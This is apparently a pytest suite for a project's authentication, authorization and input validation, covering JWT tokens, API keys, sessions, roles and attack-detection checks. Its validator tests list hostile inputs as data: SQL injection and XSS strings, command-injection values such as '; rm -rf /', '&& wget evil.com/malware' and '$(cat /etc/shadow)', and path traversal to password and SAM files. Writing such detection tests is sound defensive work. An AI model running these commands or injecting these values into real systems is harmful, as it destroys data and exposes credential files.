"""
Authentication Security Tests

Tests for:
- JWT token validation
- API key authentication
- Session management
- Brute force protection
- Password security
"""

import pytest
import time
import jwt
from datetime import datetime, timedelta
from unittest.mock import Mock, patch

from core.security.auth import AuthenticationManager, AuthorizationManager, User, UserRole, AuthContext
from core.security.validation import InputValidator


class TestAuthenticationManager:
    """Test authentication functionality"""
    
    @pytest.fixture
    def auth_config(self):
        return {
            'jwt_secret': 'test_secret_key_for_testing_only',
            'jwt_algorithm': 'HS256',
            'jwt_expiry_hours': 24,
            'api_key_length': 32,
            'default_users': [
                {
                    'id': 'test_admin',
                    'username': 'admin',
                    'roles': ['admin'],
                    'enabled': True
                },
                {
                    'id': 'test_user',
                    'username': 'user',
                    'roles': ['viewer'],
                    'enabled': True
                }
            ]
        }
    
    @pytest.fixture
    def auth_manager(self, auth_config):
        return AuthenticationManager(auth_config)
    
    def test_create_jwt_token(self, auth_manager):
        """Test JWT token creation"""
        token = auth_manager.create_jwt_token('test_admin')
        assert token is not None
        assert isinstance(token, str)
        
        # Verify token can be decoded
        payload = jwt.decode(token, auth_manager.jwt_secret, algorithms=[auth_manager.jwt_algorithm])
        assert payload['user_id'] == 'test_admin'
        assert payload['username'] == 'admin'
    
    def test_authenticate_jwt_valid(self, auth_manager):
        """Test JWT authentication with valid token"""
        token = auth_manager.create_jwt_token('test_admin')
        auth_context = auth_manager.authenticate_jwt(token)
        
        assert auth_context is not None
        assert auth_context.user.id == 'test_admin'
        assert auth_context.user.username == 'admin'
        assert UserRole.ADMIN in auth_context.user.roles
    
    def test_authenticate_jwt_invalid(self, auth_manager):
        """Test JWT authentication with invalid token"""
        invalid_token = "invalid.token.here"
        auth_context = auth_manager.authenticate_jwt(invalid_token)
        assert auth_context is None
    
    def test_authenticate_jwt_expired(self, auth_manager):
        """Test JWT authentication with expired token"""
        # Create token that expires immediately
        auth_manager.jwt_expiry = -1  # Negative hours = expired
        token = auth_manager.create_jwt_token('test_admin')
        
        # Reset expiry and try to authenticate
        auth_manager.jwt_expiry = 24
        auth_context = auth_manager.authenticate_jwt(token)
        assert auth_context is None
    
    def test_generate_api_key(self, auth_manager):
        """Test API key generation"""
        api_key = auth_manager.generate_api_key('test_admin')
        assert api_key is not None
        assert len(api_key) == auth_manager.api_key_length
        
        # Verify API key is stored
        assert api_key in auth_manager.api_keys
        assert auth_manager.api_keys[api_key] == 'test_admin'
    
    def test_authenticate_api_key_valid(self, auth_manager):
        """Test API key authentication with valid key"""
        api_key = auth_manager.generate_api_key('test_admin')
        auth_context = auth_manager.authenticate_api_key(api_key)
        
        assert auth_context is not None
        assert auth_context.user.id == 'test_admin'
    
    def test_authenticate_api_key_invalid(self, auth_manager):
        """Test API key authentication with invalid key"""
        invalid_key = "invalid_api_key"
        auth_context = auth_manager.authenticate_api_key(invalid_key)
        assert auth_context is None
    
    def test_revoke_api_key(self, auth_manager):
        """Test API key revocation"""
        api_key = auth_manager.generate_api_key('test_admin')
        assert auth_manager.authenticate_api_key(api_key) is not None
        
        # Revoke the key
        result = auth_manager.revoke_api_key(api_key)
        assert result is True
        
        # Key should no longer work
        assert auth_manager.authenticate_api_key(api_key) is None
    
    def test_disabled_user_authentication(self, auth_manager):
        """Test that disabled users cannot authenticate"""
        # Disable user
        auth_manager.users['test_admin'].enabled = False
        
        # JWT authentication should fail
        token = auth_manager.create_jwt_token('test_admin')
        assert token is None
        
        # API key authentication should fail
        api_key = "test_api_key"
        auth_manager.api_keys[api_key] = 'test_admin'
        auth_context = auth_manager.authenticate_api_key(api_key)
        assert auth_context is None
    
    def test_session_management(self, auth_manager):
        """Test session creation and authentication"""
        session_id = auth_manager.create_session('test_admin', duration_hours=1)
        assert session_id is not None
        
        # Authenticate with session
        auth_context = auth_manager.authenticate_session(session_id)
        assert auth_context is not None
        assert auth_context.user.id == 'test_admin'
    
    def test_session_expiry(self, auth_manager):
        """Test session expiry"""
        # Create session with very short duration
        session_id = auth_manager.create_session('test_admin', duration_hours=0)  # Expires immediately
        
        # Should not authenticate
        auth_context = auth_manager.authenticate_session(session_id)
        assert auth_context is None


class TestAuthorizationManager:
    """Test authorization functionality"""
    
    @pytest.fixture
    def authz_manager(self):
        return AuthorizationManager()
    
    @pytest.fixture
    def admin_context(self):
        user = User(
            id='admin',
            username='admin',
            roles=[UserRole.ADMIN],
            created_at=datetime.utcnow()
        )
        return AuthContext(
            user=user,
            method='jwt',
            token='test_token'
        )
    
    @pytest.fixture
    def viewer_context(self):
        user = User(
            id='viewer',
            username='viewer',
            roles=[UserRole.VIEWER],
            created_at=datetime.utcnow()
        )
        return AuthContext(
            user=user,
            method='jwt',
            token='test_token'
        )
    
    def test_check_permission_admin(self, authz_manager, admin_context):
        """Test admin permissions"""
        assert authz_manager.check_permission(admin_context, "config:write")
        assert authz_manager.check_permission(admin_context, "system:control")
        assert authz_manager.check_permission(admin_context, "users:delete")
    
    def test_check_permission_viewer(self, authz_manager, viewer_context):
        """Test viewer permissions"""
        assert authz_manager.check_permission(viewer_context, "config:read")
        assert authz_manager.check_permission(viewer_context, "system:monitor")
        assert not authz_manager.check_permission(viewer_context, "config:write")
        assert not authz_manager.check_permission(viewer_context, "system:control")
    
    def test_check_role(self, authz_manager, admin_context, viewer_context):
        """Test role checking"""
        assert authz_manager.check_role(admin_context, UserRole.ADMIN)
        assert not authz_manager.check_role(viewer_context, UserRole.ADMIN)
        assert authz_manager.check_role(viewer_context, UserRole.VIEWER)
    
    def test_disabled_user_authorization(self, authz_manager, admin_context):
        """Test that disabled users have no permissions"""
        admin_context.user.enabled = False
        assert not authz_manager.check_permission(admin_context, "config:read")
        assert not authz_manager.check_role(admin_context, UserRole.ADMIN)


class TestSecurityThreats:
    """Test security threat scenarios"""
    
    @pytest.fixture
    def auth_manager(self):
        config = {
            'jwt_secret': 'test_secret',
            'default_users': [
                {'id': 'test_user', 'username': 'test', 'roles': ['viewer'], 'enabled': True}
            ]
        }
        return AuthenticationManager(config)
    
    def test_jwt_algorithm_confusion(self, auth_manager):
        """Test JWT algorithm confusion attack"""
        # Create a valid token
        valid_token = auth_manager.create_jwt_token('test_user')
        
        # Try to decode with different algorithm (should fail)
        try:
            # This should not work if properly implemented
            payload = jwt.decode(valid_token, auth_manager.jwt_secret, algorithms=['none'])
            assert False, "JWT algorithm confusion vulnerability detected"
        except jwt.InvalidTokenError:
            pass  # Expected behavior
    
    def test_jwt_secret_brute_force_resistance(self, auth_manager):
        """Test JWT secret brute force resistance"""
        token = auth_manager.create_jwt_token('test_user')
        
        # Try common weak secrets
        weak_secrets = ['secret', '123456', 'password', 'jwt_secret', '']
        
        for weak_secret in weak_secrets:
            try:
                jwt.decode(token, weak_secret, algorithms=['HS256'])
                assert False, f"Weak JWT secret detected: {weak_secret}"
            except jwt.InvalidTokenError:
                pass  # Expected behavior
    
    def test_timing_attack_resistance(self, auth_manager):
        """Test timing attack resistance in authentication"""
        # Measure time for valid user
        start_time = time.time()
        auth_manager.authenticate_jwt("invalid_token")
        invalid_time = time.time() - start_time
        
        # Measure time for non-existent user
        start_time = time.time()
        auth_manager.authenticate_api_key("nonexistent_key")
        nonexistent_time = time.time() - start_time
        
        # Times should be similar (within reasonable variance)
        time_difference = abs(invalid_time - nonexistent_time)
        assert time_difference < 0.1, "Potential timing attack vulnerability"
    
    def test_session_fixation_protection(self, auth_manager):
        """Test session fixation protection"""
        # Create initial session
        session1 = auth_manager.create_session('test_user')
        
        # Create another session for same user
        session2 = auth_manager.create_session('test_user')
        
        # Sessions should be different
        assert session1 != session2, "Session fixation vulnerability detected"
        
        # Both sessions should work independently
        assert auth_manager.authenticate_session(session1) is not None
        assert auth_manager.authenticate_session(session2) is not None


class TestInputValidationSecurity:
    """Test input validation security"""
    
    @pytest.fixture
    def validator(self):
        return InputValidator({'strict_mode': True})
    
    def test_sql_injection_detection(self, validator):
        """Test SQL injection pattern detection"""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "UNION SELECT * FROM passwords",
            "admin'/**/OR/**/1=1#"
        ]
        
        for malicious_input in malicious_inputs:
            result = validator.validate_string(malicious_input)
            assert not result.is_valid, f"SQL injection not detected: {malicious_input}"
    
    def test_xss_prevention(self, validator):
        """Test XSS prevention"""
        xss_inputs = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror='alert(1)'>",
            "<iframe src='javascript:alert(1)'></iframe>"
        ]
        
        for xss_input in xss_inputs:
            result = validator.validate_string(xss_input)
            if result.is_valid:
                # If valid, sanitized value should be safe
                assert '<script>' not in result.sanitized_value.lower()
                assert 'javascript:' not in result.sanitized_value.lower()
                assert 'onerror' not in result.sanitized_value.lower()
    
    def test_command_injection_detection(self, validator):
        """Test command injection detection"""
        command_injection_inputs = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& wget evil.com/malware",
            "`curl evil.com`",
            "$(cat /etc/shadow)"
        ]
        
        for malicious_input in command_injection_inputs:
            result = validator.validate_string(malicious_input)
            assert not result.is_valid, f"Command injection not detected: {malicious_input}"
    
    def test_path_traversal_detection(self, validator):
        """Test path traversal detection"""
        path_traversal_inputs = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "\\var\\log\\auth.log"
        ]
        
        for malicious_input in path_traversal_inputs:
            result = validator.validate_string(malicious_input)
            assert not result.is_valid, f"Path traversal not detected: {malicious_input}"
    
    def test_oversized_input_rejection(self, validator):
        """Test oversized input rejection"""
        # Test with very large string
        large_string = "A" * 50000
        result = validator.validate_string(large_string)
        assert not result.is_valid, "Oversized input not rejected"
    
    def test_deeply_nested_object_rejection(self, validator):
        """Test deeply nested object rejection"""
        # Create deeply nested object
        nested_obj = {}
        current = nested_obj
        for i in range(20):  # Deeper than max allowed
            current['nested'] = {}
            current = current['nested']
        
        result = validator.validate_object(nested_obj)
        assert not result.is_valid, "Deeply nested object not rejected"


if __name__ == "__main__":
    pytest.main([__file__])